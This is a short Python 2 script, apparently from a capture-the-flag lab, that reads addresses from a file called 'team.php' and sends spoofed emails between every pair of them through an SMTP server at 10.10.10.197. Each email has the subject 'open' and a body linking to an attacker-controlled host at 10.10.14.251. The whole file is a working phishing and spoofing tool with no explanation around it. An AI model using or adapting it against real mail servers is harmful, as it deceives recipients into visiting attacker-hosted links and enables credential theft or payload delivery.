#!/usr/bin/python

import smtplib
import sys
def sendMail(senders,receivers):
	message = """From:<{sender}>
To:<{receiver}>
Subject: open 

http://10.10.14.251
""".format(sender=senders,receiver=receivers)
	print message
	try:
	   smtpObj = smtplib.SMTP('10.10.10.197')
	   smtpObj.sendmail(senders, receivers, message)
	   print "Successfully sent email \t"
	except:
		   print "Error: unable to send email \t"

def main():
	count=0
	with open('team.php') as f:
		maillist = f.read().split('\n')
	print(maillist)
	for mail1 in maillist:
		for mail2 in maillist:
			sendMail(mail1,mail2)
			count+=1
			print(count)

if __name__=='__main__':
	main()
